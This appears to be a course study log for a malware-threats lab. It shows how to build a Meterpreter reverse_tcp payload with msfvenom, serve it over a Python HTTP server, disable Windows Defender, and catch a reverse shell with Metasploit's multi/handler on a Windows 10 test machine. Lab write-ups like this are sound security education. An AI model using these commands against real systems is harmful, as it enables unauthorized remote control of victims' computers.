# Day 09 – Malware Threats (Continued) – Reverse Shell via Malware

## 📘 Module: Malware Threats (Module 7)

On Day 09, the Malware Threats module was continued with hands-on practice. The focus was on how malware can be crafted, delivered, and exploited to gain unauthorized access to a target system using reverse shells.

---

## 📚 Topics Covered

- **What are Advanced Persistent Threats (APTs)?**
  - APTs are defined as a type of network attack, where an attacker gains unauthorized access to a target network and remains undetected for a long period of time.
  - Long-term, stealthy cyberattacks targeting specific entities.
  - Often involve multiple phases: reconnaissance, exploitation, and persistence.

- **Creating a Malware Payload using `msfvenom`:**
  - Payload: `windows/meterpreter/reverse_tcp`
  - Command example:
    ```bash
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your_IP> LPORT=4444 -f exe > shell.exe
    ```

- **Transferring the Payload to the Victim (Windows 10):**
  - Hosted `shell.exe` on Kali using Python HTTP server:
    ```bash
    python3 -m http.server
    ```
  - Downloaded the file on the Windows 10 machine via browser.

- **Bypassing Windows Defender:**
  - **Turned off Real-Time Protection** in Windows Security settings to allow execution.

- **Exploiting with Metasploit:**
  - Used `msfconsole` with `exploit/multi/handler`.
  - Payload set as:
    ```bash
    use exploit/multi/handler
    set payload windows/meterpreter/reverse_tcp
    set LHOST <your_IP>
    set LPORT 4444
    run
    ```
  - Upon executing `shell.exe` on Windows, a **reverse shell** session was established via `meterpreter`.

- **Post-Exploitation Access:**
  - Confirmed full access to the victim machine through the `meterpreter` session.
  - Basic enumeration done (e.g., system info, user privileges).

---

## 🛠️ Tools and Commands Used

- `msfvenom`
- `python3 -m http.server`
- `msfconsole` with:
  - `exploit/multi/handler`
  - Payload: `windows/meterpreter/reverse_tcp`

---

## 📝 Summary

On Day 09, the theoretical understanding of malware threats was extended into practical exploitation. Using Kali Linux and Metasploit, a custom reverse shell was created and deployed against a Windows 10 machine, successfully achieving remote access. This exercise demonstrated how attackers exploit malware payloads and emphasized the need for strong endpoint protection and user awareness.
